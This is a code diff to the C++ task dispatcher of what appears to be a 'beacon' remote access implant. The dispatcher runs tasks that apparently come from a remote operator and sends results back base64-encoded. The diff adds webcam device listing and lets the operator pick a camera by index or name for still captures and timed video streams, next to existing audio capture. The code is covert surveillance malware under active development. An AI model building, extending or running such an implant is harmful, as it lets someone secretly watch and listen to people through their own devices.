@@ -22,6 +22,7 @@
 #include <stdexcept>
 #include <sstream>
 #include <filesystem>
+#include <algorithm>
 
 namespace beacon {
 
@@ -85,8 +86,26 @@ void TaskDispatcher::dispatch(const Task& task) {
                 result.output = "AUDIO:" + crypto::Base64Encode(wav);
                 break;
             }
+            case TaskType::LIST_WEBCAMS: {
+                auto json = capture::ListWebcamDevices();
+                result.output = "WEBCAM_LIST:" + json.dump();
+                break;
+            }
             case TaskType::WEBCAM: {
-                std::vector<BYTE> img = capture::CaptureWebcamImage();
+                int camIndex = 0;
+                std::string nameHint;
+                if (!task.cmd.empty()) {
+                    try {
+                        if (std::all_of(task.cmd.begin(), task.cmd.end(), ::isdigit)) {
+                            camIndex = std::stoi(task.cmd);
+                        } else {
+                            nameHint = task.cmd;
+                        }
+                    } catch (...) {
+                        nameHint = task.cmd;
+                    }
+                }
+                std::vector<BYTE> img = capture::CaptureWebcamJPEG(camIndex, nameHint);
                 if (img.empty()) result.error = "Webcam capture failed (or camera not found)";
                 else result.output = "WEBCAM:" + crypto::Base64Encode(img);
                 break;
@@ -118,20 +137,33 @@ void TaskDispatcher::dispatch(const Task& task) {
                  std::string cmd = task.cmd;
                 if (cmd.find("start") == 0) {
                     int duration = 0;
+                    int camIndex = 0;
+                    std::string nameHint;
                      try {
                         size_t space = cmd.find(' ');
-                        if (space != std::string::npos) duration = std::stoi(cmd.substr(space + 1));
+                        if (space != std::string::npos) {
+                            duration = std::stoi(cmd.substr(space + 1));
+                            size_t secondSpace = cmd.find(' ', space + 1);
+                            if (secondSpace != std::string::npos) {
+                                std::string camIdentifier = cmd.substr(secondSpace + 1);
+                                if (std::all_of(camIdentifier.begin(), camIdentifier.end(), ::isdigit)) {
+                                    camIndex = std::stoi(camIdentifier);
+                                } else {
+                                    nameHint = camIdentifier;
+                                }
+                            }
+                        }
                     } catch(...) {}
                     
                     auto cb = [this](const std::string& tid, const std::string& out) {
                          Result r; r.task_id = tid; r.output = out;
                          this->pendingResults_.enqueue(r);
                     };
-                    streaming::StartWebcamStream(duration, task.task_id, cb);
-                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream started";
+                    streaming::StartWebcamStream(duration, task.task_id, cb, camIndex, nameHint);
+                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream started";
                 } else if (cmd == "stop") {
                     streaming::StopWebcamStream();
-                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream stopped";
+                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream stopped";
                 }
                 break;
             }
